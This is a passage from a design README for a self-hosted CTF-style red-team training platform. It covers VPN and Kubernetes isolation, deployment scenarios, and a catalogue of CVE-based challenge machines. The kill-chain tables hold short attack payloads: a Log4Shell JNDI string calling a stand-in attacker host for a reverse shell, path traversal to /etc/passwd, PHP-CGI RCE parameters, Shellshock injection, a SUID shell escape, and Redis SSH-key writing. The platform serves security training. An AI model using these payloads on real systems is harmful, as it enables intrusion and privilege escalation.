# 🏴 Local-Machine — Self-Hosted Red Team Training Platform

> A **HackTheBox-style server platform** you deploy on your own dedicated server.
> Players register on the web portal, download their personal `.ovpn` file, connect once, and get full access to **42 isolated challenge machines** built on real Critical/High CVEs.
> Designed for **red team learners** who need a safe, unrestricted environment — run `nmap`, brute-force, deploy tools freely. No rate limits, no bans.
> Each machine enforces a realistic **MITRE ATT&CK kill chain** inspired by **DEFCON CTF Finals, HITCON CTF Finals, BlackHat CTF Finals**.

---

## Table of Contents

1. [Design Philosophy](#1-design-philosophy)
2. [MITRE ATT&CK Coverage Matrix](#2-mitre-attck-coverage-matrix)
3. [Architecture & Isolation Model](#3-architecture--isolation-model)
4. [Health-Check & Auto-Recovery System](#4-health-check--auto-recovery-system)
5. [Challenge Machines (42)](#5-challenge-machines-42)
6. [CVE Chaining Philosophy](#6-cve-chaining-philosophy)
7. [Multi-Architecture & Escape Challenges](#7-multi-architecture--escape-challenges)
8. [Infrastructure Components](#8-infrastructure-components)
9. [Documentation Strategy](#9-documentation-strategy)
10. [Directory Structure](#10-directory-structure)
11. [Implementation Phases](#11-implementation-phases)
12. [Verification Plan](#12-verification-plan)

---

## 1. Design Philosophy

### 1.1 Core Principles

| Principle | Description |
|-----------|-------------|
| **Hosted Server Platform** | This is a **server you run**, not a local-only tool. Players access it remotely via OpenVPN, exactly like HackTheBox. The admin deploys it on a dedicated server with a public IP. |
| **Unrestricted Practice** | Players can run `nmap -A`, `hydra`, `sqlmap`, `metasploit` without throttling, bans, or rate limits. The whole point is learning by doing — freely. |
| **Per-User Isolation (Kubernetes)** | Each registered user gets their own Kubernetes namespace acting as a private VM. Only one machine runs per user at a time, keeping resource usage flat regardless of user count. |
| **Cogwheel Chaining** | Every CVE exploit is a gear — it only turns if the previous gear moved. Flags are gated behind sequential exploitation. No step can be skipped. |
| **MITRE ATT&CK Mapping** | Every machine maps to specific ATT&CK Tactics/Techniques. The full lab covers the entire framework. |
| **Real-World Severity** | Only **Critical (9.0+)** or **High (7.0+)** CVEs from real advisories. No toy vulnerabilities. |
| **Open Source Ready** | Every machine includes detailed writeups, exploit code, and educational context. Anyone can learn from it. |

### 1.2 Kill Chain Enforcement Model

Every machine enforces this sequential dependency:

```
┌─────────────┐    ┌──────────────┐    ┌─────────────┐    ┌──────────────────┐
│   RECON      │───▶│  ENUMERATION  │───▶│  EXPLOIT     │───▶│  POST-EXPLOIT    │
│              │    │              │    │              │    │                  │
│ Port scan    │    │ Service      │    │ CVE trigger  │    │ Priv-esc / pivot │
│ Service ID   │    │ version ID   │    │ Initial      │    │ Lateral movement │
│ OS fingerpr. │    │ Vuln confirm │    │ foothold     │    │ Data exfil       │
│              │    │ Attack surf. │    │ (user flag)  │    │ (root flag)      │
└─────────────┘    └──────────────┘    └─────────────┘    └──────────────────┘
     GATE 0              GATE 1             GATE 2              GATE 3
```

Each gate produces an artifact (credential, key, token, file) that is **required** to unlock the next gate.

---

## 2. MITRE ATT&CK Coverage Matrix

The 42 machines collectively cover the **entire** MITRE ATT&CK framework:

| ATT&CK Tactic | Technique IDs Covered | Machines |
|----------------|----------------------|----------|
| **Reconnaissance** | T1595 (Active Scanning), T1592 (Gather Host Info) | All 42 |
| **Resource Development** | T1587.001 (Develop Exploits), T1588.005 (Obtain Exploits) | 39–42 (Browser) |
| **Initial Access** | T1190 (Exploit Public App), T1133 (External Remote Svc) | 01–35, 22 (React2Shell) |
| **Execution** | T1059 (Command/Script), T1203 (Exploitation for Client Exec) | All 42 |
| **Persistence** | T1505.003 (Web Shell), T1053 (Scheduled Task/Cron) | 02, 06, 10, 17, 30 |
| **Privilege Escalation** | T1068 (Exploitation), T1548 (Abuse Elevation) | 36–38, 04, 05, 25 |
| **Defense Evasion** | T1036 (Masquerading), T1055 (Process Injection) | 20, 22, 34, 39–42 |
| **Credential Access** | T1003 (OS Credential Dump), T1552 (Unsecured Creds) | 13, 14, 22, 23, 26, 32 |
| **Discovery** | T1046 (Network Scan), T1082 (System Info) | All 42 |
| **Lateral Movement** | T1021 (Remote Services), T1550 (Use Alternate Auth) | 11, 19, 22, 23, 26 |
| **Collection** | T1005 (Data from Local System), T1039 (Network Share) | 32, 33, 35 |
| **Command & Control** | T1071 (Application Layer Protocol) | 29–31 (Network Appliance) |
| **Exfiltration** | T1041 (Exfil Over C2), T1048 (Exfil Over Alt Protocol) | 33–35 (Data Transfer) |
| **Impact** | T1489 (Service Stop), T1529 (System Shutdown) | 09 (Docker escape) |

---

## 3. Architecture & Isolation Model

### 3.1 System Overview

```
  Player Browser
       │
       ▼
  ┌─────────────────────────────────────────────────────────┐
  │               PUBLIC SERVER (dedicated IP)              │
  │                                                         │
  │  ┌────────────────────┐   ┌────────────────────────┐   │
  │  │    Web Portal      │   │   OpenVPN Gateway      │   │
  │  │  register / login  │   │   udp://<IP>:1194      │   │
  │  │  profile + .ovpn   │   │   per-user cert (PKI)  │   │
  │  │  dashboard / flags │   └────────────┬───────────┘   │
  │  └────────────────────┘                │               │
  │                                        ▼               │
  │              ┌─────────────────────────────────────┐   │
  │              │       Kubernetes Cluster (k3s)       │   │
  │              │                                     │   │
  │              │  ns:user-alice    ns:user-bob  ...  │   │
  │              │  ┌───────────┐  ┌───────────┐      │   │
  │              │  │ log4hell  │  │ log4hell  │      │   │
  │              │  │ Pod+Svc   │  │ Pod+Svc   │      │   │
  │              │  │10.42.0.31 │  │10.42.0.47 │      │   │
  │              │  └───────────┘  └───────────┘      │   │
  │              └─────────────────────────────────────┘   │
  └─────────────────────────────────────────────────────────┘

  alice sees: "Log4Hell — 10.42.0.31"   (portal reads live Pod IP)
  bob   sees: "Log4Hell — 10.42.0.47"   (portal reads live Pod IP)
  → same machine, fully separate containers, different IPs
```

### 3.2 IP Assignment Model — Dynamic Pod IP

**Design choice: Dynamic Pod IP, portal-driven display.**

Each machine Pod gets a **dynamically assigned cluster IP** from k8s. The portal backend reads the live IP after Spawn and stores it in the session. The user sees their specific IP on the dashboard — no fixed IP convention needed.

**Why this is better than a fixed-IP scheme:**

| | Dynamic Pod IP ✅ | Fixed ClusterIP (10.10.x.x) |
|--|-------------------|-----------------------------|
| **IP conflict risk** | Zero — k8s assigns unique IPs | Requires per-namespace subnet tricks |
| **Routing complexity** | None — VPN NetworkPolicy isolates by namespace | Need per-user VPN route pushed per machine |
| **Resource overhead** | Pod only (no extra Service per user) | Pod + ClusterIP Service + routing rule per user |
| **Recovery** | Delete Pod → recreate → new IP auto-displayed | Must also update Service selector + route |
| **50 users, same machine** | 50 Pods, 50 different IPs, zero config | 50 identical 10.10.1.10 in 50 namespaces — routing nightmares |

**How it works in practice:**

```
alice clicks "Spawn" on Log4Hell
  → backend: kubectl apply pod/lm-alice-log4hell -n user-alice
  → k8s assigns: Pod IP 10.42.0.31
  → backend: stores {user: alice, machine: log4hell, ip: 10.42.0.31} in DB
  → portal shows alice: "Log4Hell is running — 10.42.0.31"

bob clicks "Spawn" on Log4Hell (simultaneously)
  → backend: kubectl apply pod/lm-bob-log4hell -n user-bob
  → k8s assigns: Pod IP 10.42.0.47
  → portal shows bob: "Log4Hell is running — 10.42.0.47"

NetworkPolicy ensures:
  alice's VPN traffic → only reaches ns:user-alice (10.42.0.31)
  bob's VPN traffic   → only reaches ns:user-bob   (10.42.0.47)
  → zero cross-contamination, no possibility of alice hitting bob's machine
```

### 3.3 Refresh-to-Fix Recovery

**Any issue is resolved by refreshing the page.** The portal health-check loop handles this automatically:

```
On every dashboard page load:
  backend checks: is user's active Pod in Running/Ready state?

  ├── Yes, Running → display IP as-is
  ├── Pending     → show "Starting..." spinner, poll every 3s
  ├── CrashLoop / Error → auto-delete + auto-respawn, show "Recovering..."
  └── Not found (pod gone) → auto-respawn silently, update IP in DB

Result: user refreshes → sees new IP → continues hacking
```

This means:
- **No manual intervention** needed from admin for crashed machines
- **No stale IP** shown — portal always reads live state from k8s API
- **"Respawn" button** also available on dashboard for manual trigger

### 3.4 Per-User Isolation (Kubernetes Namespaces)

Each registered player gets a dedicated Kubernetes namespace. Within it:
- Only **one machine Pod runs at a time** — switching machines deletes the previous Pod first
- **50 users = max 50 active Pods** — resource usage is flat regardless of how many machines exist
- **NetworkPolicy** ensures each user's VPN traffic can only reach Pods in their own namespace
- Ephemeral storage only — no persistent state leaks between sessions

```
User switches machine:
  [alice spawns log4hell]   → Pod lm-alice-log4hell (10.42.0.31) in ns:user-alice
  [alice switches ghostcat] → lm-alice-log4hell DELETED, lm-alice-ghostcat (10.42.0.52) starts
  [bob spawns log4hell]     → Pod lm-bob-log4hell (10.42.0.47) in ns:user-bob — no relation to alice's
```

### 3.5 Isolation Rules

| Rule | Implementation |
|------|---------------|
| **Network** | `NetworkPolicy`: each user namespace is default-deny; only their VPN IP is allowed in |
| **Single active machine** | Portal backend deletes existing Pod before creating new one (atomic) |
| **Storage** | All machine storage is `emptyDir` — wiped when Pod dies, never shared |
| **Process** | `--pid=host` never used. Each Pod has its own PID namespace. |
| **Capability** | Minimal `securityContext`. Kernel exploit machines get `SYS_PTRACE` only. |
| **Flags** | Unique per user per machine: `sha256(FLAG_SEED + USER_ID + MACHINE_ID)` |
| **IP isolation** | Dynamic Pod IPs + namespace NetworkPolicy = zero routing collision risk |

### 3.6 Infrastructure Stack

| Component | Technology | Role |
|-----------|------------|------|
| **Orchestrator** | k3s (lightweight Kubernetes) | Runs all user machine Pods |
| **VPN** | OpenVPN (`kylemanna/openvpn`) | Players connect with `.ovpn` file |
| **Web Portal** | Next.js (frontend) + FastAPI (backend) | Registration, OVPN download, Spawn, dashboard |
| **Admin CLI** | `run.sh` | Start/stop/reset/status from terminal |
| **Admin Dashboard** | Portal `/admin` panel | Live Pod view, user management, flag log |
| **Lifecycle Manager** | Kubernetes CronJob + controller | Auto-reset (60 min), health-check, Pod cleanup |
| **Database** | PostgreSQL | Users, sessions, active Pod IPs, flag submissions |

### 3.7 Player Flow (End-to-End)

```
1. Visit https://<server-ip>:8443
2. Register (username + email) → account created, namespace provisioned in k8s
3. Profile page → click "Download VPN" → get username.ovpn
4. Run:  sudo openvpn username.ovpn   (one command, stays connected forever)
5. Dashboard → pick a machine → click "Spawn"
6. Backend: creates Pod in ns:user-<name>, reads assigned IP, stores in DB
7. Dashboard shows: "Log4Hell running — 10.42.0.31"  → start hacking
8. If machine breaks: refresh page → portal detects crash → auto-respawns
9. Submit flags → earn points / rank up
10. Switch machine → old Pod deleted, new Pod spawned, new IP shown
```


---

### 3.6 Deployment Environment Configurations

The platform runs identically across all environments — only the **network exposure method** differs. Choose your scenario below.

---

#### 🖥️ Scenario A — Local Development (Your Laptop / Single Machine)

**Use this when:** You are testing or building machines yourself, not hosting for other people.

**What works:** Everything runs locally. No VPN needed — you access machines directly via their k8s cluster IP.

**Setup:**

```bash
# 1. Install k3s (local mode)
curl -sfL https://get.k3s.io | sh -

# 2. Skip OpenVPN entirely — you're already inside the cluster network
#    Access the portal directly
open http://localhost:8443

# 3. Start the portal stack
cd infra/portal && docker compose up -d

# 4. Spawn a machine (machines run as Pods in your local k3s)
./run.sh spawn 01-log4hell --user localdev

# 5. Access machine directly by cluster IP
kubectl get pod -n user-localdev -o wide   # → shows Pod IP, e.g. 10.42.0.x
nmap -sC -sV 10.42.0.x
```

**`.env` settings:**
```bash
SERVER_IP=127.0.0.1
VPN_PORT=1194
PORTAL_PORT=8443
ENABLE_VPN=false          # Skip OpenVPN in local mode
K8S_CONTEXT=default       # k3s default context
```

> **Note**: In local mode, the VPN container is optional. You interact with machines via `kubectl port-forward` or direct Pod IPs. This is for development only — not for hosting other players.

---

#### 🏠 Scenario B — Homelab / VPS (Dedicated IP, You Control the Router)

**Use this when:** You have a dedicated server at home or a VPS with a real public IP, and you want external players to connect.

**Requirements:** Public static/dedicated IP, ability to open UDP 1194 on your firewall.

**Setup:**

```bash
# 1. Set your public IP in .env
echo "SERVER_IP=123.45.67.89" >> .env    # ← your real public IP
echo "VPN_PORT=1194" >> .env

# 2. Install k3s
curl -sfL https://get.k3s.io | sh -

# 3. Initialize OpenVPN CA (one-time)
./infra/vpn/setup-ca.sh
# → PKI created, OpenVPN server started on UDP 1194

# 4. Open firewall
sudo ufw allow 1194/udp
sudo ufw allow 8443/tcp   # portal HTTPS
sudo ufw reload

# 5. Start the portal
cd infra/portal && docker compose up -d

# 6. Register first admin account via portal
open https://123.45.67.89:8443

# 7. Add players
./scripts/add-peer.sh alice    # → infra/vpn/players/alice.ovpn
./scripts/add-peer.sh bob      # → infra/vpn/players/bob.ovpn
# Send them the .ovpn file
```

**Router port forwarding** (if server is behind NAT):
| Protocol | External Port | Internal IP | Internal Port |
|----------|-------------|-------------|---------------|
| UDP | 1194 | `<your-server-LAN-ip>` | 1194 |
| TCP | 8443 | `<your-server-LAN-ip>` | 8443 |

**`.env` settings:**
```bash
SERVER_IP=123.45.67.89    # your dedicated/public IP
VPN_PORT=1194
PORTAL_PORT=8443
ENABLE_VPN=true
K8S_CONTEXT=default
FLAG_SEED=<random-32-char-string>
PORTAL_SECRET=<random-16-char-string>
```

**Player side (nothing extra needed):**
```bash
sudo openvpn alice.ovpn   # connects instantly, done
# Then open https://123.45.67.89:8443
```

---

#### 🏫 Scenario C — School Server, Open Port Allowed

**Use this when:** You are hosting on a school/university server where the network admin allows you to open **one UDP port** (typically 1194 or a custom one).

**Requirements:** Ask your network admin to:
1. Assign your server a **static internal IP** (e.g. `192.168.1.50`)
2. Forward **UDP port `<approved_port>`** from the campus edge router to your server's internal IP

**Setup:**

```bash
# 1. Find out which port was approved, e.g. UDP 51820 or 1194
APPROVED_PORT=51820   # ← use whatever port admin approved

# 2. Configure .env
cat >> .env << EOF
SERVER_IP=<campus-public-ip>   # the IP that external players resolve
VPN_PORT=${APPROVED_PORT}
PORTAL_PORT=8443
ENABLE_VPN=true
EOF

# 3. Install k3s
curl -sfL https://get.k3s.io | sh -

# 4. Initialize OpenVPN CA with the approved port
./infra/vpn/setup-ca.sh
# setup-ca.sh reads SERVER_IP and VPN_PORT from .env automatically

# 5. Open the port on the server's local firewall
sudo ufw allow ${APPROVED_PORT}/udp
sudo ufw allow 8443/tcp
sudo ufw reload

# 6. Also add iptables routing from VPN subnet to k8s Pod network
sudo iptables -A FORWARD -s 10.8.0.0/24 -d 10.42.0.0/16 -j ACCEPT
sudo iptables -A FORWARD -s 10.42.0.0/16 -d 10.8.0.0/24 -m state --state ESTABLISHED,RELATED -j ACCEPT
sudo iptables-save > /etc/iptables/rules.v4   # persist across reboot

# 7. Start portal & add peers normally
cd infra/portal && docker compose up -d
./scripts/add-peer.sh student01
./scripts/add-peer.sh student02
```

**Network flow:**
```
Student laptop
    │  sudo openvpn student01.ovpn
    ▼
Campus Edge Router (UDP <APPROVED_PORT> forwarded)
    ▼
Your Server (192.168.1.50)
    ▼
OpenVPN Container → k8s Pod (machine)
```

**`.env` settings:**
```bash
SERVER_IP=<campus-public-ip>   # NOT the server's LAN IP — the external-facing IP
VPN_PORT=51820                 # or whatever was approved
PORTAL_PORT=8443
ENABLE_VPN=true
FLAG_SEED=<random>
```

> **Tip**: If the campus web proxy blocks HTTPS on port 8443, ask admin to also forward TCP 443 → 8443, then set `PORTAL_PORT=443`.

---

#### 🔒 Scenario D — School Server, Outbound-Only (No Open Inbound Ports)

**Use this when:** The school firewall blocks **all inbound connections**. Only outbound traffic is allowed. This is the hardest case but solvable with a reverse tunnel.

**Strategy:** Use **Tailscale** (free, no open ports required) for the VPN tunnel, and **Cloudflare Tunnel** (free) for the web portal HTTPS access.

```
Student laptop
    │  tailscale up  (outbound connection to Tailscale relay)
    │
    ▼
Tailscale Network (relay-based, no open ports needed)
    │
    ▼
Your School Server  ←──── Tailscale daemon (outbound-initiated)
    │
    ├── k8s Pods (machines)
    └── Portal (via Cloudflare Tunnel → public HTTPS URL)
```

**Setup (Server side):**

```bash
# 1. Install Tailscale on the server
curl -fsSL https://tailscale.com/install.sh | sh
sudo tailscale up
# → note the Tailscale IP, e.g. 100.64.0.10

# 2. Install Cloudflare Tunnel (cloudflared) for the web portal
wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb
sudo dpkg -i cloudflared-linux-amd64.deb

# Authenticate with your Cloudflare account
cloudflared tunnel login

# Create a named tunnel
cloudflared tunnel create local-machine-portal

# Route portal traffic through the tunnel
cloudflared tunnel route dns local-machine-portal lab.yourdomain.com

# Start tunnel (portal on port 8443 → public HTTPS)
cloudflared tunnel run --url https://localhost:8443 local-machine-portal &

# 3. Install k3s (no special config needed — it's internal)
curl -sfL https://get.k3s.io | sh -

# 4. Configure .env — use Tailscale IP as SERVER_IP
cat >> .env << EOF
SERVER_IP=100.64.0.10     # ← your Tailscale IP (100.x.x.x range)
VPN_PORT=1194
PORTAL_PORT=8443
PORTAL_PUBLIC_URL=https://lab.yourdomain.com
ENABLE_VPN=true
EOF

# 5. Initialize OpenVPN CA using the Tailscale IP
./infra/vpn/setup-ca.sh
# Generated .ovpn files will have Endpoint = 100.64.0.10:1194

# 6. Start portal
cd infra/portal && docker compose up -d
```

**Setup (Player / Student side):**

```bash
# 1. Install Tailscale on their laptop
# Windows/Mac: https://tailscale.com/download
# Linux:
curl -fsSL https://tailscale.com/install.sh | sh
sudo tailscale up
# → they are now on the same Tailscale network as the server

# 2. Download their .ovpn from the portal
open https://lab.yourdomain.com   # via Cloudflare Tunnel

# 3. Connect
sudo openvpn student01.ovpn
# Endpoint resolves to 100.64.0.10 (Tailscale IP) — no open port needed
```

**`.env` settings:**
```bash
SERVER_IP=100.64.0.10          # Tailscale IP of your server
VPN_PORT=1194
PORTAL_PORT=8443
PORTAL_PUBLIC_URL=https://lab.yourdomain.com
ENABLE_VPN=true
FLAG_SEED=<random>
```

**Comparison of all 4 scenarios:**

| | Local Dev | Homelab/VPS | School (Open Port) | School (Outbound-Only) |
|--|-----------|-------------|-------------------|----------------------|
| **VPN needed** | No | OpenVPN | OpenVPN | Tailscale + OpenVPN |
| **Open port required** | No | Yes (UDP 1194) | Yes (UDP approved) | **No** |
| **Portal access** | localhost | public IP:8443 | public IP:8443 | Cloudflare Tunnel URL |
| **Player setup** | N/A | `openvpn file.ovpn` | `openvpn file.ovpn` | Install Tailscale + `openvpn` |
| **Complexity** | ⭐ | ⭐⭐ | ⭐⭐⭐ | ⭐⭐⭐⭐ |
| **Cost** | Free | Free | Free | Free |

---


## 4. Health-Check & Auto-Recovery System


### 4.1 Per-Container Health Checks

Every machine's `docker-compose.yml` includes:

```yaml
healthcheck:
  test: ["CMD-SHELL", "/healthcheck.sh"]
  interval: 30s
  timeout: 10s
  retries: 3
  start_period: 60s
```

Each `/healthcheck.sh` validates:
1. **Service is listening** on expected port(s)
2. **Vulnerability is exploitable** (lightweight self-test)
3. **Flag file exists** and is readable by intended user

### 4.2 Instance Lifecycle Manager

```
┌──────────────────────────────────────────────────────────┐
│                  lifecycle-manager.sh                      │
│                                                           │
│  FOR each machine container:                              │
│    1. Check uptime → if > 60 min → RESET                 │
│    2. Check health → if unhealthy (3x) → RESTART         │
│    3. Check status → if exited/dead → REVIVE             │
│                                                           │
│  RESET = docker compose down && docker compose up -d      │
│  RESTART = docker compose restart                         │
│  REVIVE = docker compose up -d                            │
│                                                           │
│  Runs via cron every 60 seconds                           │
│  Logs to /var/log/local-machine/lifecycle.log             │
└──────────────────────────────────────────────────────────┘
```

### 4.3 Maintenance Rules

| Rule | Value | Rationale |
|------|-------|-----------|
| **Max instance lifetime** | 60 minutes | Prevents state drift from exploitation |
| **Health check interval** | 30 seconds | Fast detection of crashed services |
| **Auto-revive on death** | Immediate | Container restarts within 60s of detection |
| **Scheduled full reset** | Every 60 min | Clean slate for next player |
| **Log retention** | 7 days | Enough for debugging, not enough to fill disk |

---

## 5. Challenge Machines (42)

### Category 1: Web Server & Runtime (01–07)

| # | Name | CVE | CVSS | ATT&CK Techniques | Multi-Step Kill Chain |
|---|------|-----|------|--------------------|-----------------------|
| 01 | **Log4Hell** | CVE-2021-44228 | 🔴 10.0 | T1190, T1059.004, T1548.001 | `nmap 10.10.1.x` → Discover Java web app on 8080 → Identify Log4j via headers → Craft JNDI payload `${jndi:ldap://attacker/a}` → Catch reverse shell → Find SUID binary → Exploit SUID → **root flag** |
| 02 | **SpringBreak** | CVE-2022-22965 | 🔴 9.8 | T1190, T1505.003, T1053.003 | `nmap` → Discover Spring Boot on 8080 → Detect Spring via `/actuator` → Class loader param manipulation → Write JSP webshell → Enumerate cron jobs → Hijack writable cron script → **root flag** |
| 03 | **PathFinder** | CVE-2021-41773 | 🔴 9.8 | T1190, T1068 | `nmap` → Apache 2.4.49 on 80 → Path traversal `/%2e%2e/%2e%2e/etc/passwd` → Enable CGI RCE → Low-priv shell → Identify kernel version → Exploit kernel CVE → **root flag** |
| 04 | **StrutsZone** | CVE-2017-5638 | 🔴 10.0 | T1190, T1059.004, T1548.003 | `nmap` → Struts2 on 8080 → Craft Content-Type OGNL injection → RCE as `tomcat` → Enumerate sudo rules → Exploit misconfigured sudo → **root flag** |
| 05 | **ShellShocked** | CVE-2014-6271 | 🔴 10.0 | T1190, T1059.004, T1548.001 | `nmap` → Apache + CGI on 80 → Inject `() { :; };` in User-Agent → Reverse shell → Find SUID `nmap` → `nmap --interactive` → **root flag** |
| 06 | **PHPocalypse** | CVE-2012-1823 | 🔴 9.8 | T1190, T1053.003 | `nmap` → PHP-CGI on 80 → Query string `?-s` leaks source → `?-d+allow_url_include=1+-d+auto_prepend_file=php://input` → RCE → Writable cron → **root flag** |
| 07 | **GhostCat** | CVE-2020-1938 | 🔴 9.8 | T1190, T1552.001 | `nmap` → Discover AJP on 8009 + HTTP on 8080 → Use Ghostcat tool to read `WEB-INF/web.xml` → Extract admin creds → Login to Tomcat Manager → Deploy WAR shell → **root flag** |

### Category 2: CMS & Web Application (08–14)

| # | Name | CVE | CVSS | ATT&CK Techniques | Multi-Step Kill Chain |
|---|------|-----|------|--------------------|-----------------------|
| 08 | **DrupalDoom** | CVE-2018-7600 | 🔴 9.8 | T1190, T1552.001, T1548.003 | `nmap` → Drupal on 80 → Drupalgeddon2 Form API RCE → Shell as `www-data` → Find MySQL creds in `settings.php` → Dump admin hash → Crack → `su` to admin user with sudo → **root flag** |
| 09 | **PressGrave** | CVE-2022-0739+ | 🔴 9.8 | T1190, T1003.003, T1611 | `wpscan` → WordPress on 80 → Identify vuln plugin → SQLi → Dump user hashes → Crack admin password → Theme editor PHP RCE → Shell → **Docker escape via shared socket** → **host root flag** |
| 10 | **BulletProof** | CVE-2019-16759 | 🔴 9.8 | T1190, T1053.003 | `nmap` → vBulletin on 80 → Pre-auth `widgetConfig` RCE → Shell → Discover hidden cronjob running as root → Write to cronjob script path → **root flag** |
| 11 | **Confluencer** | CVE-2022-26134 | 🔴 9.8 | T1190, T1021.004 | `nmap` → Confluence on 8090 → OGNL injection via URL `/${...}/` → RCE as `confluence` → Find SSH private key in home dir → Key reuse for `root` account → **root flag** |
| 12 | **GitLabyrinth** | CVE-2021-22205 | 🔴 10.0 | T1190, T1059.004 | `nmap` → GitLab on 80 → Upload DjVu file with ExifTool payload → RCE as `git` → Access GitLab Rails console → Reset admin password → Find root SSH key in admin repo → **root flag** |
| 13 | **GrafanLeak** | CVE-2021-43798 | 🔴 7.5 | T1190, T1552.001, T1021.004 | `nmap` → Grafana on 3000 → Plugin path traversal → Read Grafana config → Download SQLite DB → Extract stored creds → SSH spray → **root flag** |
| 14 | **JoomBleed** | CVE-2023-23752 | 🔴 7.5 | T1190, T1552.001, T1505.003 | `nmap` → Joomla on 80 → API info leak `/api/index.php/v1/config/application?public=true` → Get DB creds → Admin login → Template editor PHP RCE → Shell → sudo miscfg → **root flag** |

### Category 3: Framework & Library (15–22)

| # | Name | CVE | CVSS | ATT&CK Techniques | Multi-Step Kill Chain |
|---|------|-----|------|--------------------|-----------------------|
| 15 | **Ignition** | CVE-2021-3129 | 🔴 9.8 | T1190, T1021.004 | `gobuster` → Discover Laravel debug page → Ignition `_ignition/execute-solution` → `phar://` file write → RCE → Find root SSH key in `/opt` → **root flag** |
| 16 | **ThinkPwned** | CVE-2018-20062 | 🔴 9.8 | T1190, T1548.001 | `nmap` → ThinkPHP on 80 → `invokefunction` controller call → RCE → Find SUID `find` → `find . -exec /bin/sh -p \;` → **root flag** |
| 17 | **ImageTragick** | CVE-2016-3714 | 🔴 8.4 | T1190, T1053.003 | `nmap` → Image upload service → Craft MVG file with command injection → Shell → Cronjob running ImageMagick as root → Poison input dir → **root flag** |
| 18 | **ProtoPoison** | CWE-1321 | 🔴 9.8 | T1190, T1059.007 | `nmap` → Node.js API on 3000 → Fuzz JSON endpoints → Prototype pollution via `__proto__` → Poison EJS template options → Trigger SSTI → RCE → Container is root already → **root flag** |
| 19 | **PickleRick** | CWE-502 | 🔴 9.8 | T1190, T1021.006 | `nmap` → Python webapp on 5000 → Decode session cookie (base64) → Recognize Pickle format → Craft malicious Pickle → Replace cookie → RCE → Find Redis creds → Pivot to Redis instance → Write SSH key → **root flag** |
| 20 | **JWTwisted** | CVE-2022-21449 | 🔴 9.8 | T1190, T1550.001, T1090 | `nmap` → Java API on 8080 → Capture JWT → Algorithm confusion attack → Forge admin token → Access internal SSRF endpoint → Reach internal service → RCE → **root flag** |
| 21 | **WebLogicBmb** | CVE-2019-2725 | 🔴 9.8 | T1190, T1059.004 | `nmap` → WebLogic on 7001 → Discover T3/IIOP on 7001 → XMLDecoder deserialization via `/_async/AsyncResponseService` → RCE → Already root in container → **root flag** |
| 22 | **React2Shell** | CVE-2025-55182 | 🔴 10.0 | T1190, T1059.007, T1021.004 | `nmap` → Next.js App Router on 3000 → Identify RSC Flight protocol endpoint → Craft malicious serialized React Server Component payload → Trigger insecure deserialization in Flight protocol → RCE as `node` → Enumerate internal services via `process.env` → Discover database credentials → Pivot to internal PostgreSQL → Dump SSH keys from `secrets` table → SSH as privileged user → sudo miscfg → **root flag** |

> **🔥 Machine 22 — React2Shell Deep Dive**
>
> CVE-2025-55182 is a **CVSS 10.0** insecure deserialization in React Server Components (RSC) "Flight" protocol. Affects Next.js 14.x/15.x/16.x App Router, plus any framework bundling `react-server-dom-webpack`, `react-server-dom-parcel`, or `react-server-dom-turbopack` (React 19.0.0–19.2.0). A single crafted HTTP request achieves unauthenticated RCE. This machine is particularly interesting because:
> - The attack surface is **the framework itself**, not misconfiguration
> - Players must understand React's internal serialization format
> - The post-exploitation chain involves reading Node.js `process.env` to pivot laterally
> - It demonstrates how modern "safe" frameworks can harbor critical deserialization bugs

### Category 4: Enterprise Middleware (23–28)

| # | Name | CVE | CVSS | ATT&CK Techniques | Multi-Step Kill Chain |
|---|------|-----|------|--------------------|-----------------------|
| 23 | **JenkinsOwned** | CVE-2024-23897 | 🔴 9.8 | T1190, T1552.004, T1021.004 | `nmap` → Jenkins on 8080 → CLI argument file read → Leak `master.key` + `hudson.util.Secret` → Decrypt stored SSH credentials → SSH as root → **root flag** |
| 24 | **ActiveMQtter** | CVE-2023-46604 | 🔴 10.0 | T1190, T1548.003 | `nmap` → ActiveMQ on 61616 + 8161 → ClassInfo ExceptionResponse deserialization → RCE as `activemq` → Enumerate sudo → Service account sudo escape → **root flag** |
| 25 | **RedisRaider** | Miscfg | 🔴 9.8 | T1190, T1098.004, T1053.003 | `nmap` → Redis on 6379 (no auth) → `CONFIG SET dir /root/.ssh` → Write authorized_keys → SSH as root → **root flag** |
| 26 | **MongoMayhem** | Miscfg + NoSQLi | 🔴 9.1 | T1190, T1552.001, T1550.001 | `nmap` → MongoDB 27017 (no auth) + webapp 80 → Connect to Mongo → Dump `users` collection → Find webapp admin creds → Login → NoSQLi in admin panel → RCE → **root flag** |
| 27 | **ElasticPwn** | CVE-2015-1427 | 🔴 9.8 | T1190, T1552.001 | `nmap` → Elasticsearch on 9200 → Groovy script sandbox escape via `_search` → RCE as `elasticsearch` → Read config files → Cred reuse for root → **root flag** |
| 28 | **SolrBlaze** | CVE-2019-17558 | 🔴 9.8 | T1190, T1552.001, T1021.004 | `nmap` → Solr on 8983 → Velocity template injection → RCE → Read log files → Extract SSH creds → SSH as root → **root flag** |

### Category 5: Network Appliance & Proxy (29–32)

| # | Name | CVE | CVSS | ATT&CK Techniques | Multi-Step Kill Chain |
|---|------|-----|------|--------------------|-----------------------|
| 29 | **BigIPwned** | CVE-2022-1388 | 🔴 9.8 | T1190, T1071.001 | `nmap` → F5 BIG-IP on 443 → Header auth bypass → iControl REST RCE → Already root → **root flag** |
| 30 | **CitrixBreaker** | CVE-2019-19781 | 🔴 9.8 | T1190, T1505.003 | `nmap` → Citrix ADC on 443 → Path traversal → Write Perl template → Trigger template → Webshell → RCE → **root flag** |
| 31 | **IvantiGate** | CVE-2024-21887 | 🔴 9.1 | T1190, T1059.004 | `nmap` → Ivanti Connect Secure on 443 → Auth bypass chain → Command injection → RCE → Already root → **root flag** |
| 32 | **MinIOLeaker** | CVE-2023-28432 | 🔴 9.8 | T1190, T1552.001, T1021.004 | `nmap` → MinIO on 9000 → `/minio/health/cluster` env var leak → Get S3 keys → Find SSH private key in bucket → SSH → **root flag** |

### Category 6: Data & File Transfer (33–35)

| # | Name | CVE | CVSS | ATT&CK Techniques | Multi-Step Kill Chain |
|---|------|-----|------|--------------------|-----------------------|
| 33 | **MOVEitMstr** | CVE-2023-34362 | 🔴 9.8 | T1190, T1003.003 | `nmap` → MOVEit Transfer on 443 → SQLi in session handling → Extract session tokens → Impersonate sysadmin → Deserialization RCE → **root flag** |
| 34 | **ApacheNght** | CVE-2023-25690 | 🔴 9.8 | T1190, T1036.005 | `nmap` → Apache reverse proxy on 80 → HTTP Request Smuggling → Bypass auth on internal admin → Access management API → RCE → **root flag** |
